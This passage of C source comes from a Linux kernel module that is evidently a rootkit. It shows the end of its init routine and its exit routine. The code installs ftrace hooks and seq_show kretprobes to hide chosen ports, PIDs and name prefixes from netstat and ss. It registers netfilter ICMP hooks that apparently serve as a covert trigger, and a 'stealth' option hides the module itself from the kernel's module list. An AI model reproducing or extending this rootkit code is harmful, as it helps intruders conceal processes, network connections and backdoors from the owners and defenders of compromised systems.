            install_ftrace_hook(&hooks[i]);
    }
    
    // Load inet_diag module (ss hiding support)
    request_module("tcp_diag");
    
    // Setup seq_show kretprobes (netstat hiding)
    install_seq_hooks();
    
    // Setup ICMP hook (PRE_ROUTING - incoming packets)
    nf_icmp_hook_prerouting.hook = icmp_hook_func;
    nf_icmp_hook_prerouting.pf = NFPROTO_IPV4;
    nf_icmp_hook_prerouting.hooknum = NF_INET_PRE_ROUTING;
    nf_icmp_hook_prerouting.priority = NF_IP_PRI_FIRST;
    nf_register_net_hook(&init_net, &nf_icmp_hook_prerouting);
    
    // Setup ICMP hook (LOCAL_IN - locally generated)
    nf_icmp_hook_localin.hook = icmp_hook_func;
    nf_icmp_hook_localin.pf = NFPROTO_IPV4;
    nf_icmp_hook_localin.hooknum = NF_INET_LOCAL_IN;
    nf_icmp_hook_localin.priority = NF_IP_PRI_FIRST;
    nf_register_net_hook(&init_net, &nf_icmp_hook_localin);
    
    // Initialize from module parameters
    write_lock(&g_data.lock);
    for (i = 0; i < init_ports_count && i < 8; i++) {
        if (init_ports[i] > 0 && g_data.ports_count < MAX_PORTS)
            g_data.ports[g_data.ports_count++] = init_ports[i];
    }
    for (i = 0; i < init_pids_count && i < 8; i++) {
        if (init_pids[i] > 0 && g_data.pids_count < MAX_PIDS)
            g_data.pids[g_data.pids_count++] = init_pids[i];
    }
    if (init_prefix && strlen(init_prefix) > 0 && strlen(init_prefix) < PREFIX_MAXLEN) {
        strncpy(g_data.prefixes[0], init_prefix, PREFIX_MAXLEN - 1);
        g_data.prefixes_count = 1;
    }
    write_unlock(&g_data.lock);
    
    // Hide module
    if (stealth)
        mod_hide();
    
    g_data.active = true;
    
    return 0;
}

static void __exit mod_exit(void)
{
    int i;
    
    g_data.active = false;
    
    // Cleanup seq_show kretprobes
    remove_seq_hooks();
    
    // Cleanup ftrace hooks
    for (i = 0; i < HOOKS_COUNT; i++)
        remove_ftrace_hook(&hooks[i]);
    
    // Cleanup ICMP hooks
    nf_unregister_net_hook(&init_net, &nf_icmp_hook_prerouting);
    nf_unregister_net_hook(&init_net, &nf_icmp_hook_localin);
    
    // Show module
    mod_show();
}

module_init(mod_init);
module_exit(mod_exit);
